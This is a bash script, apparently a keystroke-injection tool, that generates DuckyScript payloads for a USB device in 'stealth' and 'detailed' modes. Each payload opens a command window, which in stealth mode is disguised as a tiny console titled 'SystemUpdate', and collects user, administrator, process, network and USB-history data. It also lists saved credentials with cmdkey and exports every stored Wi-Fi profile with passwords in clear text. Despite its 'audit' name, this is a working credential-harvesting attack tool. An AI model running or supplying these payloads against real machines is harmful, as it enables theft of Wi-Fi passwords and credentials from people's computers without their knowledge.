#!/bin/bash

# Ghost-Audit Payload Generator
# Version: 1.0

print_help() {
    echo "Usage: ./generate_payload.sh --mode <stealth|detailed> [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --mode      : Payload mode (stealth or detailed) - Required"
    echo "  --delay     : DEFAULT_DELAY value (Default: stealth=50, detailed=200)"
    echo "  --output    : Output file path (Default: Payloads/Generated/payload.txt)"
    echo "  --drive     : Custom export path for logs (Default: %USERPROFILE%\Desktop\Logs or PC_Audit_Logs)"
    echo "  --help, -h  : Show this help message"
    echo ""
    exit 1
}

# Defaults
MODE=""
DELAY=""
OUTPUT="Payloads/Generated/payload.txt"
DRIVE=""

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --mode) MODE="$2"; shift ;;
        --delay) DELAY="$2"; shift ;;
        --output) OUTPUT="$2"; shift ;;
        --drive) DRIVE="$2"; shift ;;
        --help|-h) print_help ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

if [ -z "$MODE" ]; then
    echo "Error: --mode is required."
    print_help
fi

# Set mode specific defaults
if [ "$MODE" == "stealth" ]; then
    [ -z "$DELAY" ] && DELAY=50
    [ -z "$DRIVE" ] && OUTPUT_DRIVE="%USERPROFILE%\Desktop\Logs" || OUTPUT_DRIVE="$DRIVE"
elif [ "$MODE" == "detailed" ]; then
    [ -z "$DELAY" ] && DELAY=200
    [ -z "$DRIVE" ] && OUTPUT_DRIVE="%USERPROFILE%\Desktop\PC_Audit_Logs" || OUTPUT_DRIVE="$DRIVE"
else
    echo "Error: Invalid mode. Use 'stealth' or 'detailed'."
    exit 1
fi

echo "Generating $MODE payload..."
echo "Delay: $DELAY"
echo "Log Drive: $OUTPUT_DRIVE"
echo "Output -> $OUTPUT"

# Create output directory if it doesn't exist
mkdir -p "$(dirname "$OUTPUT")"

# Generate Script
cat <<EOF > "$OUTPUT"
REM --- Ghost Audit ($MODE Mode Payload) Generated ---
DEFAULT_DELAY $DELAY
EOF

if [ "$MODE" == "stealth" ]; then
cat <<EOF >> "$OUTPUT"
REM --- STEP 1:RUN CMD ---
GUI r
DELAY 300
STRING cmd /k "mode con: cols=20 lines=1 & color 08 & title SystemUpdate"
ENTER
DELAY 500
REM ---STEP 2: CREATING THE BASE FILES---
STRING md "$OUTPUT_DRIVE\Sys" & md "$OUTPUT_DRIVE\Net" & md "$OUTPUT_DRIVE\Wifi"
ENTER
DELAY 200
REM --- STEP 3: SYSTEM ANALYSIS(Sys)---
STRING wmic logicaldisk get caption,size,freespace > "$OUTPUT_DRIVE\Sys\Disk.txt" & wmic memorychip get capacity,speed > "$OUTPUT_DRIVE\Sys\RAM.txt" & wmic cpu get name > "$OUTPUT_DRIVE\Sys\CPU.txt" & net user > "$OUTPUT_DRIVE\Sys\Users.txt" & net localgroup administrators > "$OUTPUT_DRIVE\Sys\Admins.txt" & reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName" > "$OUTPUT_DRIVE\Sys\Software.txt"
ENTER
DELAY 500
STRING wmic os get Caption,CSDVersion,OSArchitecture,Version > "$OUTPUT_DRIVE\Sys\OS_Info.txt" & reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR /s | findstr "FriendlyName" > "$OUTPUT_DRIVE\Sys\USB.txt" & cmdkey /list > "$OUTPUT_DRIVE\Sys\Creds.txt"
ENTER
DELAY 300
REM ---STEP 4: NETWORK ANALYSIS (Net)---
STRING ipconfig /all > "$OUTPUT_DRIVE\Net\IP.txt" & ipconfig /displaydns > "$OUTPUT_DRIVE\Net\DNS.txt" & arp -a > "$OUTPUT_DRIVE\Net\ARP.txt" & route print > "$OUTPUT_DRIVE\Net\Route.txt" & netstat -ano > "$OUTPUT_DRIVE\Net\Ports.txt" & type C:\Windows\System32\drivers\etc\hosts > "$OUTPUT_DRIVE\Net\Hosts.txt"
ENTER
DELAY 500
REM ---STEP 5: WIRELESS ANALYSIS(Wifi)---
STRING netsh wlan show all > "$OUTPUT_DRIVE\Wifi\Report.txt" & FOR /F "skip=9 tokens=*" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F "tokens=2 delims=:" %B IN ("%A") DO FOR /F "tokens=*" %C IN ("%B") DO NETSH WLAN EXPORT PROFILE name="%C" folder="$OUTPUT_DRIVE\Wifi" key=clear
ENTER
DELAY 2000
REM --- FINAL STEP ---
STRING exit
ENTER
EOF

elif [ "$MODE" == "detailed" ]; then
cat <<EOF >> "$OUTPUT"

REM --- STEP 1: RUN CMD ---
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 1000

REM VISUAL IMPROVEMENTS
STRING @echo off
ENTER
STRING cls
ENTER

REM --- STEP 2: CREATING THE BASE FILES ---
STRING md "$OUTPUT_DRIVE"
ENTER
STRING md "$OUTPUT_DRIVE\1_System"
ENTER
STRING md "$OUTPUT_DRIVE\2_Network"
ENTER
STRING md "$OUTPUT_DRIVE\3_WiFi"
ENTER
DELAY 500

REM --- STEP 3: SYSTEM ANALYSIS(1_System) ---
STRING wmic logicaldisk get caption,description,filesystem,size,freespace > "$OUTPUT_DRIVE\1_System\Disk_Info.txt"
ENTER
STRING wmic memorychip get capacity,speed,manufacturer > "$OUTPUT_DRIVE\1_System\RAM_Info.txt"
ENTER
STRING wmic cpu get name,numberofcores > "$OUTPUT_DRIVE\1_System\CPU_Info.txt"
ENTER
DELAY 500
STRING net user > "$OUTPUT_DRIVE\1_System\Users.txt"
ENTER
STRING net localgroup administrators > "$OUTPUT_DRIVE\1_System\Admins.txt"
ENTER
STRING cmdkey /list > "$OUTPUT_DRIVE\1_System\Saved_Credentials_List.txt"
ENTER
DELAY 300
STRING tasklist /v > "$OUTPUT_DRIVE\1_System\Running_Processes.txt"
ENTER
DELAY 300
STRING wmic startup get caption,command > "$OUTPUT_DRIVE\1_System\Startup_Apps.txt"
ENTER
DELAY 1000
ENTER
STRING wmic service get name,displayname,state,startmode > "$OUTPUT_DRIVE\1_System\All_Services.txt"
ENTER
DELAY 1500
ENTER
STRING set > "$OUTPUT_DRIVE\1_System\Env_Variables.txt"
ENTER
DELAY 300
STRING reg query HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR /s | findstr "FriendlyName" > "$OUTPUT_DRIVE\1_System\USB_History.txt"
ENTER
DELAY 500
STRING reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName" > "$OUTPUT_DRIVE\1_System\Installed_Software.txt"
ENTER
DELAY 8000
STRING systeminfo > "$OUTPUT_DRIVE\1_System\Full_OS_Info.txt"
ENTER
DELAY 8000

REM --- STEP 4: NETWORK ANALYSIS (2_Network) ---

STRING ipconfig /all > "$OUTPUT_DRIVE\2_Network\IP_Config.txt"
ENTER
STRING ipconfig /displaydns > "$OUTPUT_DRIVE\2_Network\DNS_History.txt"
ENTER
STRING arp -a > "$OUTPUT_DRIVE\2_Network\ARP_Table.txt"
ENTER
STRING route print > "$OUTPUT_DRIVE\2_Network\Route_Table.txt"
ENTER
STRING netstat -ano > "$OUTPUT_DRIVE\2_Network\Active_Connections.txt"
ENTER
DELAY 500
STRING net share > "$OUTPUT_DRIVE\2_Network\Network_Shares.txt"
ENTER
STRING netsh advfirewall show allprofiles > "$OUTPUT_DRIVE\2_Network\Firewall_State.txt"
ENTER
STRING type C:\Windows\System32\drivers\etc\hosts > "$OUTPUT_DRIVE\2_Network\Hosts_File.txt"
ENTER
DELAY 500

REM --- STEP 5: WIRELESS ANALYSIS (3_WiFi) ---
STRING netsh wlan show networks mode=bssid > "$OUTPUT_DRIVE\3_WiFi\Nearby_Networks_Scan.txt"
ENTER
DELAY 1000
STRING netsh wlan show all > "$OUTPUT_DRIVE\3_WiFi\Full_Report.txt"
ENTER
DELAY 500
STRING FOR /F "skip=9 tokens=*" %A IN ('NETSH WLAN SHOW PROFILES') DO FOR /F "tokens=2 delims=:" %B IN ("%A") DO FOR /F "tokens=*" %C IN ("%B") DO NETSH WLAN EXPORT PROFILE name="%C" folder="$OUTPUT_DRIVE\3_WiFi" key=clear
ENTER
DELAY 3000

REM --- FINAL STEP ---
STRING cls
ENTER
DELAY 2000
STRING exit
ENTER
EOF
fi

echo "Success! Payload saved to $OUTPUT"
